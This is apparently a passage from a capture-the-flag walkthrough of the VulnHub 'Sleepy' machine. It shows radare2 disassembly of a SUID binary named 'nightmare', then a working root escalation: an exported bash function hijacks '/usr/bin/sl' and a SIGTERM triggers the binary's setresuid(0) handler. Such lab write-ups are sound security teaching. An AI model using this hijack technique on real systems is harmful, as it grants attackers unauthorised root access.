<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span>find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span><span class='line'>find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span><span class='line'>/usr/bin/mount
</span><span class='line'>/usr/bin/chage
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/su
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/umount
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/pkexec
</span><span class='line'>/usr/bin/crontab
</span><span class='line'>/usr/bin/nightmare
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/sbin/pam_timestamp_check
</span><span class='line'>/usr/sbin/unix_chkpwd
</span><span class='line'>/usr/sbin/usernetctl
</span><span class='line'>/usr/lib/polkit-1/polkit-agent-helper-1
</span><span class='line'>/usr/lib64/dbus-1/dbus-daemon-launch-helper
</span><span class='line'>bash-4.2<span class="nv">$ </span>ls -alh /usr/bin/nightmare
</span><span class='line'>ls -alh /usr/bin/nightmare
</span><span class='line'>-rwsr-s---. <span class="m">1</span> root tomcat 8.5K Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare
</span></code></pre></td></tr></table></div></figure>


<p>Download the binary &ldquo;/usr/bin/nightmare&rdquo; to my local Kali Linux and using disassembler <code>Radare 2</code> to analyze the binary.</p>

<p>Disassemble all functions and print the code of function &lsquo;main&rsquo;:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nl">root@kali:</span><span class="err">~/</span><span class="nf">myNotes</span><span class="err">/</span><span class="no">Vulnhub_notes</span><span class="err">/</span><span class="no">the</span> <span class="no">sleepy</span><span class="c"># r2 nightmare </span>
</span><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">aa</span>
</span><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">main</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">250</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083e</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083f</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400842</span>    <span class="mi">4881</span><span class="no">eca0000.</span> <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0xa0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400849</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400850</span>    <span class="no">ba98000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x98</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400855</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085a</span>    <span class="mi">4889</span><span class="no">c7</span>       <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400660</span> <span class="p">(</span><span class="no">fcn.00400656</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085d</span>    <span class="no">e8fefdffff</span>   <span class="no">call</span> <span class="no">sym.imp.memset</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.memset</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400862</span>    <span class="mi">48</span><span class="no">c78560fff.</span> <span class="no">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span><span class="p">,</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040086d</span>    <span class="no">c745e800000.</span> <span class="no">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">rbp-0x18</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400874</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040087b</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400880</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400883</span>    <span class="no">bf02000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400610</span> <span class="p">(</span><span class="no">fcn.00400606</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400888</span>    <span class="no">e883fdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="na">...</span> <span class="no">turncate</span> <span class="no">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the result above, I notice that there is a function <code>sym.sigHandler</code> be used to deal with signal <code>SIGINT(0x2)</code> and <code>SIGTERM(0xf)</code>, so I decided to print it out</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.sigHandler</span> <span class="mi">281</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040081f</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400820</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400823</span>    <span class="mi">4883</span><span class="no">ec10</span>     <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x10</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400827</span>    <span class="mi">897</span><span class="no">dfc</span>       <span class="no">mov</span> <span class="err">[</span><span class="no">rbp-0x4</span><span class="err">]</span><span class="p">,</span> <span class="no">edi</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040082a</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040082f</span>    <span class="no">e899ffffff</span>   <span class="no">call</span> <span class="no">sym.train</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.train</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400834</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400839</span>    <span class="no">e862feffff</span>   <span class="no">call</span> <span class="no">sym.imp.exit</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.exit</span><span class="p">()</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">250</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083e</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083f</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400842</span>    <span class="mi">4881</span><span class="no">eca0000.</span> <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0xa0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400849</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400850</span>    <span class="no">ba98000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x98</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400855</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085a</span>    <span class="mi">4889</span><span class="no">c7</span>       <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400660</span> <span class="p">(</span><span class="no">fcn.00400656</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085d</span>    <span class="no">e8fefdffff</span>   <span class="no">call</span> <span class="no">sym.imp.memset</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.memset</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400862</span>    <span class="mi">48</span><span class="no">c78560fff.</span> <span class="no">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span><span class="p">,</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040086d</span>    <span class="no">c745e800000.</span> <span class="no">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">rbp-0x18</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400874</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040087b</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400880</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400883</span>    <span class="no">bf02000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400610</span> <span class="p">(</span><span class="no">fcn.00400606</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400888</span>    <span class="no">e883fdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040088d</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400894</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400899</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040089c</span>    <span class="no">bf0f000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0xf</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004008a1</span>    <span class="no">e86afdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="na">...</span> <span class="no">turncate</span> <span class="no">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is another function &ldquo;sym.train&rdquo; be called:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">sym.train</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x0040082f</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x004007cd</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x0040080f</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.train</span> <span class="mi">66</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007cd</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ce</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007d1</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007d6</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007db</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007e0</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007e5</span>    <span class="no">e836feffff</span>   <span class="no">call</span> <span class="no">sym.imp.setresuid</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.setresuid</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ea</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ef</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007f4</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007f9</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007fe</span>    <span class="no">e82dfeffff</span>   <span class="no">call</span> <span class="no">sym.imp.setresgid</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.setresgid</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400803</span>    <span class="no">bfec094000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">str.usrbinslal</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400640</span> <span class="p">(</span><span class="no">fcn.00400636</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400808</span>    <span class="no">e833feffff</span>   <span class="no">call</span> <span class="no">sym.imp.system</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.system</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040080d</span>    <span class="mi">5</span><span class="no">d</span>           <span class="no">pop</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">\</span>           <span class="err">0</span><span class="nf">x0040080e</span>    <span class="no">c3</span>           <span class="no">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>In this function <code>sym.train</code>, the attacker noticed that uid and gid have been set to &lsquo;0&rsquo; (which is ROOT) and then make a system call with parameter <code>str.usrbinslal</code>.</p>

<p>By checking the string of &ldquo;str.usrbinslal&rdquo; as follow, I know the system function has been called like this <code>system("/usr/bin/sl -al")</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">ps</span> <span class="err">@</span> <span class="no">str.usrbinslal</span>
</span><span class='line'><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sl</span> <span class="p">-</span><span class="no">al</span>
</span></code></pre></td></tr></table></div></figure>


<p>Based on <a href="https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/" title="g0blin's walkthrough">g0blin&rsquo;s post</a>, I defined an evil function by using sl&rsquo;s full path as the name <code>/usr/bin/sl</code> and then run the vulnerable program <code>nightmare</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'>bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
</span><span class='line'>/usr/bin/nightmare
</span><span class='line'>Error opening terminal: unknown.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?
</span></code></pre></td></tr></table></div></figure>


<p>In order to send <code>SIGTERM</code> signal to <code>nightware</code>, I opened another MSF session by refreshing the trojan web page.</p>

<p>In the new session, I sent <code>SIGTERM</code> signal to process <code>nightmare</code> by using command <code>kill -15 &lt;pid&gt;</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span>ps aux <span class="p">|</span> grep night
</span><span class='line'>ps aux <span class="p">|</span> grep night
</span><span class='line'>root      <span class="m">2312</span>  0.0  0.0   <span class="m">4164</span>   <span class="m">356</span> pts/0    S+   00:29   0:00 /usr/bin/nightmare
</span><span class='line'>tomcat    <span class="m">2329</span>  0.0  0.1   <span class="m">9032</span>   <span class="m">672</span> pts/1    R+   00:33   0:00 grep night
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">kill</span> -15 2312
</span><span class='line'><span class="nb">kill</span> -15 2312
</span></code></pre></td></tr></table></div></figure>


<p>Now change back to previous session and we got ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'>bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
</span><span class='line'>Error opening terminal: unknown.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2#
</span><span class='line'>
</span><span class='line'>bash-4.2# id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
</span><span class='line'>bash-4.2# ls -al /root
</span><span class='line'>ls -al /root
</span><span class='line'>total 44
</span><span class='line'>dr-xr-x---.  <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">19</span> 00:52 .
</span><span class='line'>drwxr-xr-x. <span class="m">18</span> root root  <span class="m">4096</span> Nov <span class="m">13</span> 21:59 ..
</span><span class='line'>lrwxrwxrwx.  <span class="m">1</span> root root     <span class="m">9</span> Jan <span class="m">18</span>  <span class="m">2015</span> .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root    <span class="m">18</span> Dec <span class="m">29</span>  <span class="m">2013</span> .bash_logout
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">176</span> Dec <span class="m">29</span>  <span class="m">2013</span> .bash_profile
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">100</span> Dec <span class="m">29</span>  <span class="m">2013</span> .cshrc
</span><span class='line'>-rw-------.  <span class="m">1</span> root root   <span class="m">133</span> Jan <span class="m">18</span>  <span class="m">2015</span> .lesshst
</span><span class='line'>drwx------.  <span class="m">2</span> root root     <span class="m">6</span> Jun <span class="m">19</span> 08:39 .ssh
